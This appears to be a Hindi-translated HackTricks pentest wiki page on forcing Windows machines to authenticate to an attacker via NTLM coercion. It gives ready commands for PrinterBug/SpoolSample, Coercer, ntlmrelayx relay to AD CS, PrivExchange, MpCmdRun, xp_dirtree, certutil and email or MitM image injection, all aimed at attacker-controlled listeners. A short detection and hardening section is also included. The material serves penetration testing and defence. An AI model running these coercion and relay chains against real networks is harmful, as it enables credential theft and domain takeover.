# NTLM Privileged Authentication को बाध्य करना

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) C# में MIDL compiler का उपयोग करके बनाया गया **remote authentication triggers** का एक **collection** है, जो third-party dependencies से बचाता है।

## Spooler Service का दुरुपयोग

यदि _**Print Spooler**_ service **enabled** है, तो आप पहले से ज्ञात AD credentials का उपयोग करके Domain Controller के print server से नए print jobs पर **update** का अनुरोध कर सकते हैं और उसे बस यह बता सकते हैं कि notification किसी **system** को भेज दे।\
ध्यान दें कि जब printer notification किसी मनमाने system को भेजता है, तो उसे उस **system** के साथ **authenticate** करना पड़ता है। इसलिए, attacker _**Print Spooler**_ service से किसी मनमाने system के साथ authenticate करवा सकता है, और इस authentication में service **computer account का उपयोग करेगी**।

अंदरूनी तौर पर, classic **PrinterBug** primitive `\\PIPE\\spoolss` पर **`RpcRemoteFindFirstPrinterChangeNotificationEx`** का दुरुपयोग करता है। Attacker पहले printer/server handle खोलता है और फिर `pszLocalMachine` में एक नकली client name देता है, जिससे target spooler एक notification channel **attacker-controlled host की ओर** बनाता है। इसी वजह से इसका प्रभाव **outbound authentication coercion** होता है, न कि सीधे code execution।<sup>[[2]](#references)</sup>\
यदि आप spooler में ही **RCE/LPE** ढूँढ़ रहे हैं, तो [PrintNightmare](printnightmare.md) देखें। यह पेज **coercion और relay** पर केंद्रित है।

### Domain पर Windows Servers ढूँढ़ना

Windows hosts की सूची बनाने के लिए PowerShell का उपयोग करें। Servers आमतौर पर सबसे उच्च-प्राथमिकता वाले targets होते हैं, इसलिए पहले उन पर ध्यान दें:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Listening स्थिति में Spooler services ढूँढना

@mysmartlogin (Vincent Le Toux) के [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) के थोड़े संशोधित version का उपयोग करके देखें कि Spooler Service listening कर रही है या नहीं:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

आप Linux पर `rpcdump.py` का उपयोग करके **MS-RPRN** protocol भी खोज सकते हैं:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

या Linux से hosts को जल्दी test करें **NetExec/CrackMapExec** के साथ:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

यदि आप केवल spooler endpoint मौजूद है या नहीं, यह जांचने के बजाय **coercion surfaces enumerate** करना चाहते हैं, तो **Coercer scan mode** का उपयोग करें:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

यह उपयोगी है, क्योंकि EPM में endpoint दिखने का मतलब सिर्फ़ यह है कि print RPC interface रजिस्टर है। इससे **यह गारंटी नहीं मिलती** कि मौजूदा privileges के साथ हर coercion method तक पहुँचा जा सकता है या host कोई उपयोगी authentication flow भेजेगा।

### Service से किसी भी host के विरुद्ध authenticate करने को कहें

आप [मूल repository से SpoolSample](https://github.com/leechristensen/SpoolSample) compile कर सकते हैं।

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

या यदि आप Linux पर हैं, तो [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें।

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

**Coercer** के साथ, आप spooler interfaces को सीधे target कर सकते हैं और यह अनुमान लगाने से बच सकते हैं कि कौन-सा RPC method exposed है:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### आधुनिक RPC-over-TCP callbacks

यह न मानें कि सफल `RpcRemoteFindFirstPrinterChangeNotificationEx` call से TCP/445 पर ट्रैफ़िक आना ही चाहिए। **Windows 11 22H2 और इसके बाद के संस्करण print communications के लिए डिफ़ॉल्ट रूप से RPC over TCP का उपयोग करते हैं**; policy या `RpcUseNamedPipeProtocol=1` इसे फिर से सक्षम न करे, तो RPC over named pipes अक्षम रहता है। इसलिए, केवल SMB सुनने वाले पुराने listeners यह रिपोर्ट कर सकते हैं कि trigger भेज दिया गया, जबकि उन्हें callback कभी नहीं मिलता। Microsoft सामान्य print RPC के लिए TCP/135 (Endpoint Mapper) और dynamic RPC ports का दस्तावेज़ देता है; संगठन इस range को सीमित कर सकते हैं या fixed print RPC port चुन सकते हैं।<sup>[[10]](#references)</sup>

वर्तमान **Impacket `ntlmrelayx.py`** में एक RPC relay server और छोटा Endpoint Mapper शामिल है, जो डिफ़ॉल्ट रूप से TCP/135 पर enabled रहते हैं। यह support जून 2025 में खास तौर पर प्रदर्शित PrinterBug-to-AD-CS chain के साथ merge किया गया था, जिससे authenticated RPC callback को तब भी relay किया जा सकता है, जब victim SMB/WebDAV पर fallback न करे।<sup>[[11]](#references)</sup>

RPC relay/EPM support **Impacket 0.13.0 और इसके बाद के संस्करणों** में उपलब्ध है। TCP/135 listener न मिलने की जांच करने से पहले, पुष्टि करें कि कोई पुराना packaged `ntlmrelayx.py` तो execute नहीं हो रहा है; help output में दोनों RPC-server switches दिखने चाहिए।<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

`Setting up RPC Server on port 135` और `RPCD: Received connection` को relay output में देखें। अगर RPC call से अपेक्षित error मिलता है, लेकिन listener तक कुछ नहीं पहुँचता, तो victim की print RPC transport policy, outbound filtering, DNS resolution और यह जाँचें कि TCP/135 पर पहले से कोई दूसरा process तो नहीं चल रहा। यह भी सुनिश्चित करें कि `ntlmrelayx` को `--no-rpc-server` के साथ शुरू नहीं किया गया था।

### WebClient से SMB के बजाय HTTP का उपयोग करवाना

जिन systems में अब भी **RPC over named pipes** (legacy builds या policy-restored behavior) का उपयोग होता है, उनमें classic PrinterBug से आम तौर पर `\\attacker\share` पर **SMB** authentication मिलता है। यह **capture**, **HTTP targets पर relay** या उन जगहों पर **relay** के लिए उपयोगी है जहाँ SMB signing मौजूद नहीं है।\
हालाँकि, **SMB से SMB** relay करना अक्सर **SMB signing** से अवरुद्ध हो जाता है, इसलिए operators इसके बजाय **HTTP/WebDAV** authentication करवाना पसंद कर सकते हैं। ऊपर बताए गए RPC-over-TCP behavior के लिए यह कोई fallback नहीं है।

अगर target पर **WebClient** service चल रही है, तो listener को ऐसे रूप में निर्दिष्ट किया जा सकता है जिससे Windows **WebDAV over HTTP** का उपयोग करे:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

यह विशेष रूप से **`ntlmrelayx --adcs`** या अन्य HTTP relay targets के साथ chaining करते समय उपयोगी है, क्योंकि इससे coerced connection पर SMB relayability पर निर्भर नहीं रहना पड़ता। महत्वपूर्ण caveat यह है कि HTTP/WebDAV variant के काम करने के लिए victim पर **WebClient चलना चाहिए**।

### Unconstrained Delegation के साथ संयोजन

यदि किसी attacker ने [Unconstrained Delegation](unconstrained-delegation.md) के लिए configure किए गए computer से समझौता कर लिया है, तो वह **printer को उस computer पर authenticate करने के लिए coerce कर सकता है**। इसके बाद printer computer account का **TGT**, unconstrained-delegation host की memory में cache हो जाता है, जहाँ attacker इसे [Pass the Ticket](pass-the-ticket.md) के साथ retrieve और reuse कर सकता है।

### Detection और hardening संबंधी नोट्स

ऐसे DC, PAW या server से PrinterBug हटाने का सबसे विश्वसनीय तरीका, जिस पर printing की आवश्यकता नहीं है, Spooler को stop और disable करना है। जहाँ printing आवश्यक हो, वहाँ हर संभावित relay destination को harden करें (SMB server signing, LDAP signing/channel binding और AD CS जैसी HTTP services पर EPA), न कि यह मानकर चलें कि callback path पर TCP/445 block करना पर्याप्त है।<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

यदि host को अभी भी **local printing** की आवश्यकता है, तो अधिक सीमित नियंत्रण GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` है। यह spooler को remote client connections (और printer sharing) स्वीकार करने से रोकता है, जबकि service को स्थानीय रूप से उपलब्ध रखता है; इसे लागू करने के बाद spooler restart करें, फिर ऊपर दिए गए MS-RPRN reachability checks दोहराएँ।<sup>[[13]](#references)</sup>

Detection में MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` पर authenticated call को सहसंबंधित करना चाहिए—विशेषकर opnum 62/65 को, जब non-local callback value हो—और spooler host से तुरंत होने वाले outbound SMB, HTTP या RPC connection को भी। केवल `\PIPE\spoolss` तक पहुँच को नहीं, बल्कि **interface UUID/opnum और source/destination pairs** को baseline करें, क्योंकि मौजूदा print stacks callback को RPC-over-TCP पर भेज सकते हैं।<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (वे interfaces/opnums जो outbound auth को trigger करते हैं)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Notes: उसी spooler pipe पर asynchronous print interface; किसी host पर reachable methods की सूची बनाने के लिए Coercer का उपयोग करें<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (\\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon के ज़रिए भी)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

ध्यान दें: ये methods ऐसे parameters स्वीकार करते हैं जिनमें UNC path (जैसे, `\\attacker\share`) हो सकता है। Process किए जाने पर, Windows उस UNC से authenticate करेगा (machine/user context में), जिससे NetNTLM capture या relay संभव होता है।\
Spooler abuse के लिए, **MS-RPRN opnum 65** सबसे आम और अच्छे से documented primitive बना हुआ है, क्योंकि protocol specification स्पष्ट रूप से बताती है कि server, `pszLocalMachine` में निर्दिष्ट client के लिए notification channel बनाता है।<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even पर MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target दिए गए backup log path को खोलने का प्रयास करता है और attacker-controlled UNC से authenticate करता है।<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) से NetNTLM emit करवाएँ, फिर इसे AD CS endpoints (ESC8/ESC11 scenarios) या अन्य privileged services पर relay करें।<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack **Exchange Server `PushSubscription` feature** में मिली एक flaw का परिणाम है। यह feature किसी भी ऐसे domain user के ज़रिए, जिसके पास mailbox हो, Exchange server को HTTP पर client द्वारा दिए गए किसी भी host से authenticate करने के लिए बाध्य कर सकता है।

Default रूप से, **Exchange service SYSTEM के रूप में चलती है** और उसे अत्यधिक privileges दिए जाते हैं (विशेष रूप से, **2019 Cumulative Update से पहले domain पर WriteDacl privileges**)। इस flaw का फायदा उठाकर **LDAP पर information relay की जा सकती है और इसके बाद domain NTDS database निकाला जा सकता है**। यदि LDAP पर relay करना संभव न हो, तो इस flaw का उपयोग domain के दूसरे hosts पर relay और authenticate करने के लिए फिर भी किया जा सकता है। इस attack के सफल exploitation से किसी भी authenticated domain user account के साथ तुरंत Domain Admin तक पहुँच मिल जाती है।

## Windows के अंदर

यदि आप पहले से Windows machine के अंदर हैं, तो privileged accounts का उपयोग करके Windows को किसी server से connect करने के लिए बाध्य कर सकते हैं:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

या इस अन्य technique का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM authentication को coerce करने के लिए certutil.exe lolbin (Microsoft-signed binary) का उपयोग किया जा सकता है:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Email के जरिए

अगर आपको उस **user का email address** पता है जो उस machine में login करता है जिसे आप compromise करना चाहते हैं, तो आप उसे बस **1x1 image** वाला एक **email** भेज सकते हैं, जैसे

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

जब victim इसे खोलता है, तो Windows authenticate करने की कोशिश करता है।

### MitM

अगर आप MitM attack कर सकते हैं और victim द्वारा देखे जा रहे page में HTML inject कर सकते हैं, तो इस तरह की image inject करने की कोशिश करें:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## NTLM authentication को force और phish करने के अन्य तरीके


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 को crack करना

अगर आप [NTLMv1 challenges capture कर सकते हैं, तो उन्हें crack करने का तरीका यहां पढ़ें](../ntlm/index.html#ntlmv1-attack)।\
_याद रखें कि NTLMv1 को crack करने के लिए आपको Responder challenge को "1122334455667788" पर सेट करना होगा_



## References

- [1] [Unit 42 – Authentication coercion का विकास जारी है](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11 में print के लिए RPC connection updates](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx के लिए RPC relay server और Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 release](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Print Spooler को client connections स्वीकार करने की अनुमति दें](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
